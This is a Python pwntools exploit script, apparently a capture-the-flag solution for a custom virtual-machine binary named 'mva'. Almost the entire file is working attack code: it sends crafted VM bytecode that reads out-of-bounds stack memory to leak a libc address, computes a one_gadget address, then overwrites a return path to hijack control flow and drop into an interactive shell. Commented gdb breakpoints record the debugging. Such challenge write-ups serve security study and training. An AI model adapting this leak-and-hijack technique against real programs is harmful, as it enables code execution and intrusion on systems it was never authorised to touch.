from pwn import *

p = process('/share/hufu/mva/mva')
context.log_level = 'debug'
context.terminal = ['tmux','new-window']

#功能f
#p = gdb.debug('/share/hufu/mva/mva','b *0x555555555a00')
#功能e
#p = gdb.debug('/share/hufu/mva/mva','b *0x5555555559db')
#功能9
#p = gdb.debug('/share/hufu/mva/mva','b *0x5555555557e6')
#return
#p = gdb.debug('/share/hufu/mva/mva','b *0x555555555a62')

payload = ''
payload += '\x01\x00\x01\x0c'#21c[0]=0x10c
payload += '\x0e\x00\xf6\x00'#21c[-20]=21c[0]
payload += '\x0f\x00\x00\x00'#print(-210+ 21c[-20]*2 ) 
payload += '\x01\x00\x01\x0d'
payload += '\x0e\x00\xf6\x00'
payload += '\x0f\x00\x00\x00' #print(libc)
payload += '\x01\x00\x01\x0e'
payload += '\x0e\x00\xf6\x00'
payload += '\x0f\x00\x00\x00' #print(libc)

payload += "\x01\x00\x01\x0c" #21c[0] =  0x010c
payload += "\x0e\x00\xf6\x00" #21c[-10] = 21c[0]
payload += "\x01\x00\x00\x00" #21c[0] =  0x0000
payload += "\x0e\x00\xf7\x00" #21c[-9] = 21c[0]
payload += "\x01\x00\x00\x00" #21c[0] =  0x0000
payload += "\x0e\x00\xf8\x00" #21c[-8] = 21c[0]
payload += "\x01\x00\x80\x00" #21c[0] =  0x8000
payload += "\x0e\x00\xf9\x00" #21c[-7] = 21c[0]
payload += "\x09\x01\x50\xac" #main -210+var230*2
payload += "\x00\x00\x00\x00" #call main



p.sendafter('now :',payload.ljust(0x100,'a'))
p.recvuntil('[+] MVA is starting ...\n')
libcAddr = hex(int(p.recvuntil('\n')[:-1])).strip('0x')
libcAddr = hex(int(p.recvuntil('\n')[:-1])).strip('0x') + libcAddr
libcAddr = hex(int(p.recvuntil('\n')[:-1])).strip('0x') + libcAddr
libcAddr = '0x' + libcAddr
libcAddr = int(libcAddr,16) - 0x240B3
success('libcAddr = ' + hex(libcAddr))

one_gadget = libcAddr + 0xe3b31
success('one_gadget = ' + hex(one_gadget))
one_gadget = p64(one_gadget)[::-1]

payload = b''
payload += b"\x01\x00\x01\x0c" #21c[0] =  0x010c
payload += b"\x0e\x00\xf6\x00" #21c[-10] = 21c[0]
payload += b"\x01\x00\x00\x00" #21c[0] =  0x0000
payload += b"\x0e\x00\xf7\x00" #21c[-9] = 21c[0]
payload += b"\x01\x00\x00\x00" #21c[0] =  0x0000
payload += b"\x0e\x00\xf8\x00" #21c[-8] = 21c[0]
payload += b"\x01\x00\x80\x00" #21c[0] =  0x8000
payload += b"\x0e\x00\xf9\x00" #21c[-7] = 21c[0]

payload += b'\x01\x00\x01\x0c'
payload += b'\x0e\x00\xf6\x00'
payload += b'\x09\x01' + one_gadget[6:8] #mains
payload += b'\x01\x00\x01\x0d'
payload += b'\x0e\x00\xf6\x00'
payload += b"\x09\x01" + one_gadget[4:6] #main
payload += b'\x01\x00\x01\x0e'
payload += b'\x0e\x00\xf6\x00'
payload += b"\x09\x01" + one_gadget[2:4] #main
payload += b"\x00\x00\x00\x00" #call main
payload += b"\x08\x00\x00\x00"
payload += b"\x08\x00\x00\x00"
payload += b"\x00\x00\x00\x00"

p.sendafter('now :',payload.ljust(0x100,b'a'))
p.interactive()
